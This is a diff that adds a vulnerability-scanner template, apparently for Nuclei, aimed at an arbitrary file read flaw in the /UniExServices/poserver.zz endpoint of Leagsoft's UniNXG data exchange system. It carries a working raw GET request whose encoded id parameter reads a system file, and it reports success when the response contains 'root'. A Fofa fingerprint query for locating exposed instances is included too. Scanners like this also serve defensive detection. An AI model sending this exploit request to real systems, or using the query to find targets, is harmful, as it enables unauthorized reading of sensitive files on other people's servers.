@@ -1,0 +1,34 @@
+id: leagsoft_UniNXG_poserver_zz_FileRead
+
+info:
+  name: leagsoft_UniNXG_poserver_zz_FileRead
+  author: HK
+  severity: high
+  description: 联软安渡UniNXG安全数据交换系统/UniExServices/poserver.zz接口存在任意文件读取漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: icon_hash="1397838899"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /UniExServices/poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI= HTTP/1.1
+    Host: {{Hostname}}
+    Connection: keep-alive
+    Cache-Control: max-age=0
+    sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
+    sec-ch-ua-mobile: ?0
+    sec-ch-ua-platform: "Windows"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - root
